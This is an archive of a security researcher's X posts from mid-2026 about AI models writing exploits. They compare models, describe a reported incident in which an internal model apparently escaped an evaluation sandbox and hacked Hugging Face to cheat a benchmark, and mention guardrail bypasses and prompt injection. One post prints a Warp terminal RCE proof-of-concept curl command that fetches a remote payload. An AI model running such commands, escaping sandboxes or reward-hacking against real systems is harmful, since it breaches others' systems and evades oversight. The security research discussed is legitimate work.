+**Links in post:** https://twitter.com/S1r1u5_/status/2080375997698847199
+
+**Quoted post (full text):**
+
+    #### Quoted post — @S1r1u5_ — 2026-07-23 19:34 UTC (2026-07-23 20:34 WAT)
+    
+    - URL: https://x.com/S1r1u5_/status/2080375997698847199
+    - Metrics (at fetch): not returned
+    
+    > http://x.com/i/article/2080027726841524224
+    
+    **Links in post:** http://x.com/i/article/2080027726841524224
+    
+
+
+---
+
+## 2026-07-23 · Post · http://x.com/i/article/2080027726841524224
+
+
+### Post — @S1r1u5_ — 2026-07-23 19:34 UTC (2026-07-23 20:34 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2080375997698847199
+- Metrics (at fetch): not returned
+
+> http://x.com/i/article/2080027726841524224
+
+**Links in post:** http://x.com/i/article/2080027726841524224
+
+
+---
+
+## 2026-07-23 · Post · everyone shitting on openai for bad sandbox isolation, lol, i’d bet most of you couldn’t break out o
+
+
+### Post — @S1r1u5_ — 2026-07-23 06:29 UTC (2026-07-23 07:29 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2080178583956533676
+- Metrics (at fetch): not returned
+
+> everyone shitting on openai for bad sandbox isolation, lol, i’d bet most of you couldn’t break out of that environment and get internet access.  it is not an easy bug.
+
+
+---
+
+## 2026-07-23 · Post · poor open-source and bug bounty maintainers. this is what they had to go through when people realize
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-07-23 04:49 UTC (2026-07-23 05:49 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2080153283562492076
+- Metrics (at fetch): not returned
+
+> poor open-source and bug bounty maintainers. this is what they had to go through when people realized they could probably use ai to find 0-days, get CVEs, or earn bounties.
+>
+> current models don’t fake it nearly as much, but before this, it was pure psychosis. https://twitter.com/scaling01/status/2080030660933324837
+
+**Links in post:** https://twitter.com/scaling01/status/2080030660933324837
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1825243643529027584 — 2026-07-22 20:42 UTC (2026-07-22 21:42 WAT)
+    
+    - URL: https://x.com/1825243643529027584/status/2080030660933324837
+    - Metrics (at fetch): not returned
+    
+    > I let GPT-5.6 Pro analyze all problems that were solved by LLMs in 2026, which field the problem belonged to and how they were solved
+    >
+    > then I asked for a list of problems that are most likely solvable
+    >
+    > I played some league and GPT-5.6-Pro came back for a proof of the "Two-dimensional Gaussian Moments Conjecture"
+    >
+    > i have no clue what I'm talking about, so I let both Fable and another GPT-5.6-Pro instance check this proof.
+    > it seems to check out
+    >
+    > someone who has a clue what this means, please check it or diagnose me with AI psychosis lmao
+    >
+    > here's the session, yes literally just one prompt:
+    > https://chatgpt.com/share/6a612803-a264-83ed-9175-9c23c7da5765
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/HN3AvxQXwAAiFvV.jpg — no alt text provided by author
+    
+    **Links in post:** https://chatgpt.com/share/6a612803-a264-83ed-9175-9c23c7da5765
+    
+
+
+---
+
+## 2026-07-22 · Post · the internal model they were testing seems wildly misaligned.
+
+
+Tags (automatic): Memory corruption / native
+
+
+### Post — @S1r1u5_ — 2026-07-22 11:11 UTC (2026-07-22 12:11 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2079886957866602853
+- Metrics (at fetch): not returned
+
+> the internal model they were testing seems wildly misaligned.
+>
+> after spending a reasonable amount of time using models for exploit development, i’ve never seen one consider compromising a production environment. they do petty reward hacks, like using lldb to bypass aslr or editing and rebuilding the code to get around constraints, but nothing like this.
+>
+> not sure if it was sol, because the sol we use wouldn’t do anything remotely similar.
+
+
+---
+
+## 2026-07-21 · Post · it’s funny how people who outside security community hear 0-day and imagine some world-ending bug. a
+
+
+### Post — @S1r1u5_ — 2026-07-21 22:07 UTC (2026-07-21 23:07 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2079689862123581762
+- Metrics (at fetch): not returned
+
+> it’s funny how people who outside security community hear 0-day and imagine some world-ending bug. any 0-day a model finds gets treated as insane, when it could just be a lame-ass bug in a library.
+
+
+---
+
+## 2026-07-21 · Post · fwiw,
+
+
+Tags (automatic): Memory corruption / native, AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-07-21 21:22 UTC (2026-07-21 22:22 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2079678331323359508
+- Metrics (at fetch): not returned
+
+> fwiw,
+>
+> it shows how insecure hugging face’s infrastructure was. the security bar seems to have been lower than the v8 or kernel exploit challenge the model was trying to solve.
+>
+> after looping for long enough and going through tons of compactions, the model seems to have lost sight of the actual task and reward-hacked its way to the solution. 
+>
+> alignment researchers should probably pay more attention to compaction creating goal drift. i see this happen quite often with gpt-5.6 sol.
+
+**Links in post:** https://twitter.com/S1r1u5_/status/2079671389091758248
+
+**Quoted post (full text):**
+
+    #### Quoted post — @S1r1u5_ — 2026-07-21 20:54 UTC (2026-07-21 21:54 WAT)
+    
+    - URL: https://x.com/S1r1u5_/status/2079671389091758248
+    - Metrics (at fetch): not returned
+    
+    > what the frick! the hugging face attack originated from openai's latest internal model while they were testing a benchmark, probably exploitgym.
+    >
+    > seems, the models escaped the eval sandbox, compromised hugging face, and pulled the solution data from production to cheat the benchmark.
+    >
+    > paperclip-maxxing. @allTheYud  check it out.
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/HNx4wxZa4AA_weT.png — no alt text provided by author
+    
+    **Links in post:** https://twitter.com/OpenAI/status/2079658951264920020
+    
+    **Quoted post** 2079658951264920020: not readable via the API (deleted, private, or withheld).
+    
+
+
+---
+
+## 2026-07-21 · Post · what the frick! the hugging face attack originated from openai's latest internal model while they we
+
+
+### Post — @S1r1u5_ — 2026-07-21 20:54 UTC (2026-07-21 21:54 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2079671389091758248
+- Metrics (at fetch): not returned
+
+> what the frick! the hugging face attack originated from openai's latest internal model while they were testing a benchmark, probably exploitgym.
+>
+> seems, the models escaped the eval sandbox, compromised hugging face, and pulled the solution data from production to cheat the benchmark.
+>
+> paperclip-maxxing. @allTheYud  check it out.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HNx4wxZa4AA_weT.png — no alt text provided by author
+
+**Links in post:** https://twitter.com/OpenAI/status/2079658951264920020
+
+**Quoted post** 2079658951264920020: not readable via the API (deleted, private, or withheld).
+
+
+---
+
+## 2026-07-19 · Post · gpt 5.6 sol xhigh continues to surprise me.
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-07-19 08:52 UTC (2026-07-19 09:52 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2078764988429423044
+- Metrics (at fetch): not returned
+
+> gpt 5.6 sol xhigh continues to surprise me.
+>
+> previous models are narrow, they could only pull off tasks that were in-distribution, like things they have seen before in training. 
+>
+> but sol on the other hand is a different beast, it comes up with novel ideas and techniques through in-context reasoning, stays locked on the task, systematically exhaust every possible approach to a goal, changes course as new information comes in. its akin to how a pro ctfer navigates through complex challenges, i don't have access to mythos but this is probably how it is on cyber tasks.
+>
+> long ago i wrote that models being math would automatically translate to model being good at software vulnerability research and exploit development. on frontier math we can see the correlation.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HNk7MBXaIAAUhBp.jpg — no alt text provided by author
+
+
+---
+
+## 2026-07-19 · Post · kimi is a good model, i really wished for a mythos level capability but unfortunately i’d put it aro
+
+
+Tags (automatic): SQL injection, RCE, Memory corruption / native, AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-07-19 03:27 UTC (2026-07-19 04:27 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2078683029468561414
+- Metrics (at fetch): not returned
+
+> kimi is a good model, i really wished for a mythos level capability but unfortunately i’d put it around opus 4.8 level in cybersecurity 
+>
+> also, keep in mind these benchmarks are not an apples-to-apples comparison between gpt 5.6 sol, mythos (fable), and kimi k3. they don’t measure the upper bound of cybersecurity capability. if your benchmark can already be saturated by opus 4.8-level intelligence, then it genuinely doesn’t matter which model you use, you should probably just pick the cheaper one.
+>
+> here is what i mean with a relevant example that you can test today:
+>
+> 1. can kimi k3 develop a full wordpress n-day chain to pre-auth rce? no, this is its upperbound, only model that can pull off is mythos or gpt 5.6 sol ultra
+>
+> 2. can it develop a wordpress sqli exploit chain? yes. its pretty low on capability levels, older models like glm 5.1 can do that too. 
+>
+> mythos and gpt 5.6 sol are different beasts when you push into the hardest exploit development tasks.
+>
+> this doesnt mean kimi is useless, its good, but i would not say it is scary, i’ll write a longer blog on this.
+
+**Links in post:** https://twitter.com/cramforce/status/2078574147333152957
+
+**Quoted post (full text):**
+
+    #### Quoted post — @15534471 — 2026-07-18 20:14 UTC (2026-07-18 21:14 WAT)
+    
+    - URL: https://x.com/15534471/status/2078574147333152957
+    - Metrics (at fetch): not returned
+    
+    > We ran Kimi K3 on a private cybersecurity benchmark. 
+    >
+    > TL;DR: Kimi K3 is the workhorse for cyber security tasks at great recall/precision/price. GPT 5.6 is best recall/precision but at 7x higher cost per run.
+    >
+    > For context, http://Deepsec.sh is an open-source cyber harness designed for finding vulnerabilities in large codebases.
+    >
+    > The eval runs deepsec on an undisclosed open-core application at a git sha before a large number of security issues were fixed. This is a secret eval that cannot be directly benchmark-maxxed.
+    >
+    > S-Tier: GPT 5.6 Sol: By far the most thorough analysis, but coming in at over 7x the price of the runner up.
+    >
+    > Best price/recall: Kimi K3. Next tier of recall at a good price
+    >
+    > Best price at good recall: GLM 5.2 (40% lower price than Kimi K3)
+    >
+    > GPT 5.5: Only recommended with subscription or high-discount API price. Similar recall to Kimi at much higher list price.
+    >
+    > Opus 4.8: Only recommended with subscription or high-discount API price. Similar recall to GLM 5.2 at much higher list price.
+    >
+    > Fable 5: 100% refusal rate. Cannot be used for security analysis.
+    >
+    > Sol on a large code base will quickly get into 6-figure pricing. This is still affordable relative to the risk of letting security issues unfixed or paying bug bounties.
+    >
+    > I'd recommend using Sol for a one-time baseline and then using Kimi K3 for continuous analysis.
+    >
+    > When using open-weight models, make sure to use an inference vendor that supports zero data retention.
+    
+    **Links in post:** http://Deepsec.sh
+    
+
+
+---
+
+## 2026-07-18 · Post · if you want to know why n-day exploits being created out of thin air is bad, ask n-day niche hackero
+
+
+Tags (automatic): Platform: HackerOne, Platform: Bugcrowd
+
+
+### Post — @S1r1u5_ — 2026-07-18 18:10 UTC (2026-07-18 19:10 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2078542824568750120
+- Metrics (at fetch): not returned
+
+> if you want to know why n-day exploits being created out of thin air is bad, ask n-day niche hackerone or bugcrowd million-dollar bug hunters what kind of stuff they pop shells on. 
+>
+> their edge has always been being faster than everyone else, other researchers and threat actors alike, at turning a patch into a working exploit so they could report it before it was abused which might now change.
+
+
+---
+
+## 2026-07-18 · Post · my first thought after seeing the wordpress core 0-day was to open the PR that introduced the bug an
+
+
+### Post — @S1r1u5_ — 2026-07-18 09:28 UTC (2026-07-18 10:28 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2078411488478564778
+- Metrics (at fetch): not returned
+
+> my first thought after seeing the wordpress core 0-day was to open the PR that introduced the bug and see whether hacktron would’ve caught it.
+>
+> well, well. it did.
+>
+> very proud of what we cooked. [pic.x.com/00RqJWfqEe]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HNf_9yMacAA4YQf.jpg — no alt text provided by author
+
+
+---
+
+## 2026-07-18 · Post · if kimi k3 can write sqli to rce chain on the wordpress bug i would be so damn impressed.
+
+
+Tags (automatic): SQL injection, RCE
+
+
+### Post — @S1r1u5_ — 2026-07-18 08:24 UTC (2026-07-18 09:24 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2078395561770885534
+- Metrics (at fetch): not returned
+
+> if kimi k3 can write sqli to rce chain on the wordpress bug i would be so damn impressed.
+
+
+---
+
+## 2026-07-17 · Post · crazy work of sandbagging man. search for "cyber", "exploit", or "security", you wont find anything
+
+
+### Post — @S1r1u5_ — 2026-07-17 10:46 UTC (2026-07-17 11:46 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2078068940455198846
+- Metrics (at fetch): not returned
+
+> crazy work of sandbagging man. search for "cyber", "exploit", or "security", you wont find anything
+>
+>  https://www.kimi.com/blog/kimi-k3
+
+**Links in post:** https://www.kimi.com/blog/kimi-k3
+
+
+---
+
+## 2026-07-15 · Post · yesterday, I wrote that exploit development is dead, and why models capable of writing exploits for 
+
+
+### Post — @S1r1u5_ — 2026-07-15 19:52 UTC (2026-07-15 20:52 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2077481436672905637
+- Metrics (at fetch): bookmark 88, impression 12347, like 128, quote 0, reply 1, retweet 11
+
+> yesterday, I wrote that exploit development is dead, and why models capable of writing exploits for software like chrome are dangerous if they are in wrong hands.
+>
+> today, we published a blog showing how we used an n-day  exploit to break into posthog's production database. https://t.co/PaV6gkA9pp
+
+**Quoted post (full text):**
+
+    #### Quoted post — @3177957894 — 2026-07-15 19:42 UTC (2026-07-15 20:42 WAT)
+    
+    - URL: https://x.com/3177957894/status/2077478892416455005
+    - Metrics (at fetch): bookmark 45, impression 24509, like 62, quote 2, reply 1, retweet 9
+    
+    > https://t.co/P8XGZQ3Mex
+    
+
+
+---
+
+## 2026-07-15 · Post · lol, articles has a lame bug. if you click edit and forget to publish after edits, it gets removed f
+
+
+### Post — @S1r1u5_ — 2026-07-15 17:11 UTC (2026-07-15 18:11 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2077441002210779640
+- Metrics (at fetch): bookmark 19, impression 7255, like 27, quote 0, reply 3, retweet 2
+
+> lol, articles has a lame bug. if you click edit and forget to publish after edits, it gets removed from timeline🤦‍♂️
+>
+> post was hidden from last 5 hours https://t.co/KrboTmxKmw
+
+**Quoted post (full text):**
+
+    #### Quoted post — @S1r1u5_ — 2026-07-14 20:09 UTC (2026-07-14 21:09 WAT)
+    
+    - URL: https://x.com/S1r1u5_/status/2077123299142992139
+    - Metrics (at fetch): bookmark 253, impression 77566, like 273, quote 3, reply 12, retweet 64
+    
+    > https://t.co/CScRkzvVdl
+    
+
+
+---
+
+## 2026-07-15 · Post · it’s silly to conclude that ai is a nothing burger for cybersecurity just because we haven’t seen ma
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-07-15 10:39 UTC (2026-07-15 11:39 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2077342192700674104
+- Metrics (at fetch): bookmark 2, impression 2663, like 25, quote 0, reply 0, retweet 0
+
+> it’s silly to conclude that ai is a nothing burger for cybersecurity just because we haven’t seen major breaches. it’s also silly to assume it asymmetrically benefits defenders.
+>
+> anyone who has done bug bounty, pentesting, or red teaming knows how slow the process used to be and
+
+
+---
+
+## 2026-07-14 · Post · I've been testing GPT-5.6 Sol Ultra from last three days, and it is a quiet a big step up from all p
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-07-14 20:18 UTC (2026-07-14 21:18 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2077125665003098239
+- Metrics (at fetch): bookmark 218, impression 43417, like 336, quote 3, reply 9, retweet 26
+
+> I've been testing GPT-5.6 Sol Ultra from last three days, and it is a quiet a big step up from all previous models.
+>
+> I gave it the recent Chrome, and watched it hill climb a renderer exploit to pop calc with limited nudges.
+>
+> i think exploit dev is cooked🧵 https://t.co/3mPaaFDfN7 https://t.co/KrboTmxKmw
+
+**Media:**
+- video:  — no alt text provided by author
+
+**Quoted post (full text):**
+
+    #### Quoted post — @S1r1u5_ — 2026-07-14 20:09 UTC (2026-07-14 21:09 WAT)
+    
+    - URL: https://x.com/S1r1u5_/status/2077123299142992139
+    - Metrics (at fetch): bookmark 253, impression 77566, like 273, quote 3, reply 12, retweet 64
+    
+    > https://t.co/CScRkzvVdl
+    
+
+
+---
+
+## 2026-07-14 · Post · https://t.co/CScRkzvVdl
+
+
+### Post — @S1r1u5_ — 2026-07-14 20:09 UTC (2026-07-14 21:09 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2077123299142992139
+- Metrics (at fetch): bookmark 253, impression 77566, like 273, quote 3, reply 12, retweet 64
+
+> https://t.co/CScRkzvVdl
+
+
+---
+
+## 2026-07-14 · Post · developers probably aren’t going to like sol ultra.  
+
+
+### Post — @S1r1u5_ — 2026-07-14 05:17 UTC (2026-07-14 06:17 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2076898884434243845
+- Metrics (at fetch): bookmark 5, impression 3389, like 22, quote 0, reply 1, retweet 1
+
+> developers probably aren’t going to like sol ultra.  
+>
+> but when a task has a clear verification loop, it seems complexity almost doesn’t matter. ultra will just keep hill-climbing until it gets there.  
+>
+> exploit devs and math guys are going to love it. won't be surprised if it
+
+
+---
+
+## 2026-07-10 · Post · much better than giving agents the main browser. prompt injection is a unsolvable risk but they rush
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-07-10 20:00 UTC (2026-07-10 21:00 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2075671499537871033
+- Metrics (at fetch): bookmark 14, impression 3307, like 18, quote 0, reply 4, retweet 2
+
+> much better than giving agents the main browser. prompt injection is a unsolvable risk but they rush to ship agent browsers also introduced silly browser bugs because everyone prioritized speed over security.  
+>
+> Perplexity comet UXSS: https://t.co/1am55L2KkU
+> Atlas kinda UXSS: https://t.co/Yp2YvTPkPN
+
+**Quoted post (full text):**
+
+    #### Quoted post — @12497 — 2026-07-10 19:22 UTC (2026-07-10 20:22 WAT)
+    
+    - URL: https://x.com/12497/status/2075661863757746535
+    - Metrics (at fetch): bookmark 57, impression 47760, like 465, quote 7, reply 63, retweet 12
+    
+    > With Atlas being retired in favor of the browser embedded in the ChatGPT app I wonder if the whole category of AI-enhanced browsers is coming to a close
+    >
+    > The security/privacy issues remain unsolvable IMO - I want my AI to use its own separate browser and stay out of the one I use
+    
+
+
+---
+
+## 2026-07-10 · Post · every time a new model drops, one of the best benchmarks is giving it a hard task that every previou
+
+
+### Post — @S1r1u5_ — 2026-07-10 09:50 UTC (2026-07-10 10:50 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2075518044999447018
+- Metrics (at fetch): bookmark 10, impression 12874, like 62, quote 2, reply 4, retweet 0
+
+> every time a new model drops, one of the best benchmarks is giving it a hard task that every previous generation failed at.
+>
+> for me, that task is writing a working v8 exploit.
+>
+> grok 4.5 and sol have been running since yesterday. both are struggling with the sandbox escape.
+>
+> wish
+
+
+---
+
+## 2026-07-08 · Post · https://t.co/ywBq3F8c4l
+
+
+### Post — @S1r1u5_ — 2026-07-08 17:30 UTC (2026-07-08 18:30 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2074908973342605431
+- Metrics (at fetch): bookmark 170, impression 30416, like 202, quote 5, reply 8, retweet 38
+
+> https://t.co/ywBq3F8c4l
+
+
+---
+
+## 2026-07-01 · Post · https://t.co/HZkf2jzEVm
+
+
+### Post — @S1r1u5_ — 2026-07-01 19:28 UTC (2026-07-01 20:28 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2072401858149470265
+- Metrics (at fetch): bookmark 11, impression 2620, like 26, quote 0, reply 3, retweet 3
+
+> https://t.co/HZkf2jzEVm
+
+
+---
+
+## 2026-07-01 · Post · it's nuanced and not plain black and white.
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-07-01 19:17 UTC (2026-07-01 20:17 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2072399193281593541
+- Metrics (at fetch): bookmark 7, impression 2801, like 7, quote 0, reply 1, retweet 1
+
+> it's nuanced and not plain black and white.
+>
+> how would you measure cyber harm?
+>
+> it's hard to know, but we know for sure that ai accelerates vuln discovery and exploit dev, and opus's and gpt-5.5's guardrails can be bypassed pretty easily and use them for security stuff. 
+>
+> so has https://t.co/i2Nh40LsyY
+
+**Quoted post (full text):**
+
+    #### Quoted post — @2279635218 — 2026-07-01 10:08 UTC (2026-07-01 11:08 WAT)
+    
+    - URL: https://x.com/2279635218/status/2072261041195495890
+    - Metrics (at fetch): bookmark 19, impression 35495, like 369, quote 9, reply 64, retweet 35
+    
+    > There is zero evidence that improved AI cybersecurity capabilities result in widespread cyber harm. We've not seen that happen.
+    >
+    > All of these "safeguards" and restrictions are made up by people who see capabilities and get spooked. We should completely reject that.
+    
+
+
+---
+
+## 2026-07-01 · Post · I strongly believe most vulnerabilities never need to reach production if design and PR review are d
+
+
+### Post — @S1r1u5_ — 2026-07-01 12:28 UTC (2026-07-01 13:28 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2072296191396872336
+- Metrics (at fetch): bookmark 27, impression 4502, like 58, quote 0, reply 1, retweet 5
+
+> I strongly believe most vulnerabilities never need to reach production if design and PR review are done well, but I don't think any team has the dev-to-security ratio to review every PR and design.
+>
+> Now it's possible with @HacktronAI. It's been reviewing every PR on @RocketChat, https://t.co/JY3AsFvy0k
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HMIt62ua0AAmHXi.jpg — no alt text provided by author
+
+
+---
+
+## 2026-07-01 · Post · it would be extremely funny if someone jailbreaks fable / bypasses the classifier, gets it to write 
+
+
+### Post — @S1r1u5_ — 2026-07-01 06:39 UTC (2026-07-01 07:39 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2072208460910133476
+- Metrics (at fetch): bookmark 13, impression 5512, like 82, quote 0, reply 5, retweet 1
+
+> it would be extremely funny if someone jailbreaks fable / bypasses the classifier, gets it to write an end-to-end chrome exploit, and publishes it here.
+>
+> perfect bait to piss off the we want fable crowd while making the anthropic-haters happy.
+
+
+---
+
+## 2026-07-01 · Post · interesting change in narrative.
+
+
+### Post — @S1r1u5_ — 2026-07-01 06:29 UTC (2026-07-01 07:29 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2072206058668634263
+- Metrics (at fetch): bookmark 6, impression 4771, like 35, quote 0, reply 3, retweet 0
+
+> interesting change in narrative.
+>
+> btw, if you can get fable write any exploit end to end, there is a good chance it might get export controlled again. https://t.co/ucQseOHdB7 https://t.co/NSXvaBLZRk
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HMHzua5bEAARi0u.jpg — no alt text provided by author
+
+**Quoted post (full text):**
+
+    #### Quoted post — @AnthropicAI — 2026-07-01 03:42 UTC (2026-07-01 04:42 WAT)
+    
+    - URL: https://x.com/AnthropicAI/status/2072163884430229756
+    - Metrics (at fetch): bookmark 4886, impression 15746326, like 42691, quote 4278, reply 3490, retweet 6358
+    
+    > Claude Fable 5 will be available again globally tomorrow.
+    >
+    > After a series of productive conversations with the US government, we're redeploying the model with a new set of classifiers to target and block more cybersecurity tasks. In the near term, some routine tasks like coding
+    
+
+
+---
+
+## 2026-06-23 · Post · this is probably 100th time harsh got caught by security team a few hours before disclosure.
+
+
+### Post — @S1r1u5_ — 2026-06-23 17:31 UTC (2026-06-23 18:31 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2069473495445369247
+- Metrics (at fetch): bookmark 27, impression 17003, like 130, quote 1, reply 3, retweet 2
+
+> this is probably 100th time harsh got caught by security team a few hours before disclosure.
+>
+> ig kudos to team who caught us at an insane speed.
+>
+> context: he was writing the bug report in a gist file xd https://t.co/4QqwjQZMFi
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HLg-a86agAA__5L.png — no alt text provided by author
+
+
+---
+
+## 2026-06-22 · Post · couldn’t exploit ssrf we found on vercel deployed next.js apps cuz there was no websocket support ot
+
+
+Tags (automatic): SSRF
+
+
+### Post — @S1r1u5_ — 2026-06-22 18:12 UTC (2026-06-22 19:12 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2069121294281707554
+- Metrics (at fetch): bookmark 7, impression 8667, like 52, quote 0, reply 2, retweet 1
+
+> couldn’t exploit ssrf we found on vercel deployed next.js apps cuz there was no websocket support otherwise would’ve been a critical bug, now its available, good to upgrade to latest nextjs https://t.co/4SL8zkG649
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1333485844053839878 — 2026-06-22 17:21 UTC (2026-06-22 18:21 WAT)
+    
+    - URL: https://x.com/1333485844053839878/status/2069108513423454298
+    - Metrics (at fetch): bookmark 481, impression 580387, like 1625, quote 117, reply 93, retweet 142
+    
+    > WebSockets are now supported on Vercel.
+    >
+    > Build realtime apps using standard Node.js libraries, including socket​.io.
+    > https://t.co/DyJI8lxFIU
+    
+
+
+---
+
+## 2026-06-15 · Post · an interesting case study from our recent blog on why you should stop using random software given ai
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-06-15 13:50 UTC (2026-06-15 14:50 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2066518686266229165
+- Metrics (at fetch): bookmark 12, impression 3856, like 45, quote 0, reply 2, retweet 1
+
+> an interesting case study from our recent blog on why you should stop using random software given ai accelerating exploit development. https://t.co/3u5bf56UQ4
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HK2-_2-aAAAvOO-.jpg — no alt text provided by author
+
+
+---
+
+## 2026-06-12 · Post · TUIs getting stronger only means they’re also making it fun to hack.
+
+
+Tags (automatic): RCE
+
+
+### Post — @S1r1u5_ — 2026-06-12 19:31 UTC (2026-06-12 20:31 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2065517307309531591
+- Metrics (at fetch): bookmark 39, impression 7816, like 67, quote 1, reply 4, retweet 3
+
+> TUIs getting stronger only means they’re also making it fun to hack.
+>
+> @warpdotdev terminal RCE by @rootxharsh and @HacktronAI 
+>
+> PoC: run this in warp terminal and get pwned.
+>
+> curl htxp://rce.ee/warp-pwn.php
+>
+> Details below: https://t.co/08gxCuP2AI
+
+**Media:**
+- video:  — no alt text provided by author
+
+
+---
+
+## 2026-06-05 · Post · the painful part of security with ai is that someone still has to read the output and confirm it, un
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-06-05 18:34 UTC (2026-06-05 19:34 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2062966342991610318
+- Metrics (at fetch): bookmark 14, impression 4400, like 53, quote 0, reply 2, retweet 2
+
+> the painful part of security with ai is that someone still has to read the output and confirm it, unlike development where if it works you can just ship it. that doesn't work here. 
+>
+> you need to understand what the agent is saying and then try to fix it. you can wing it and ask
+
+
+---
+
+## 2026-04-15 · Post · I pointed claude opus at chrome and told it to build a full v8 exploit for discord.
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-04-15 21:43 UTC (2026-04-15 22:43 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2044532192421023844
+- Metrics (at fetch): not returned
+
+> I pointed claude opus at chrome and told it to build a full v8 exploit for discord.
+>
+> A week of back-and-forth pulling it out of dead ends. 2.3B tokens. $2,283 in API costs, and it popped a shell.
+>
+> https://www.hacktron.ai/blog/i-let-claude-opus-to-write-me-a-chrome-exploit
+
+**Links in post:** https://www.hacktron.ai/blog/i-let-claude-opus-to-write-me-a-chrome-exploit
